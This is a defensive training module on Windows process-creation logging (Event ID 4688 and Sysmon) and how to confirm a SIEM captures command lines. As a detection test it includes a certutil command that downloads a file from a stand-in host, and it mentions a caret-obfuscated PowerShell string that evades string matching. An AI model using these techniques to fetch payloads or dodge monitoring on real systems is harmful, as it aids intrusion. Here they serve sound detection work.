# Validating Process Execution Visibility

## 1. Orientation

### What this module covers
This module covers **Event ID 4688**. "A process was created."

### Fit in the Learning Path
Malware must run logic. That means a Process. If you see every process, you see the malware.

### Learning Objectives
By the end of this module, you should understand:
*   **Command Line Arguments** (The smoking gun).
*   **Parent-Child Ancestry**.
*   **Integrity Levels**.

---

## 2. Core Content

### The Missing Config
Default Windows logging **does not** log Command Line Arguments.
*   Log: `powershell.exe created`.
*   *Useless*.

**Required Config**: Enable "Include Command Line in Process Creation events" via GPO.
*   Log: `powershell.exe -enc <evil_base64>`.
*   *Useful*.

### Sysmon (System Monitor)
Microsoft's free super-logger.
*   Event ID 1: Process Create (Has hashes!).
*   *Validation*: Install Sysmon. Run `calc.exe`. Check Event Viewer > Applications > Microsoft > Windows > Sysmon.

---

## 3. Guided Practice

### The "Living off the Land" Test
**Action**: `certutil.exe -urlcache -split -f http://test.com/file`.

**Validation**:
1.  Check SIEM.
2.  Do you see `certutil.exe`? (Yes).
3.  Do you see the URL `http://test.com/file`?
    *   No? -> Turn on Command Line Logging.
    *   Yes? -> **Success**.

---

## 4. Reflection Check

1.  **Volume**: Process logs generate massive data. (Filter out `splunk-forwarder.exe` or `antivirus.exe` to save space).
2.  **Obfuscation**: Does `p^o^w^e^r^s^h^e^l^l` bypass logging? (It bypasses string matching, but the EDR usually normalizes it).
3.  **Hash**: Why log the hash? (So you can search for that specific version of `evil.exe` across the fleet).

---

## 5. Completion Criteria

This module is complete when:
1.  You have enabled **Command Line Logging**.
2.  You treat **Sysmon** or **EDR** as mandatory.
3.  You can trace a process tree (`word` -> `cmd` -> `powershell`).
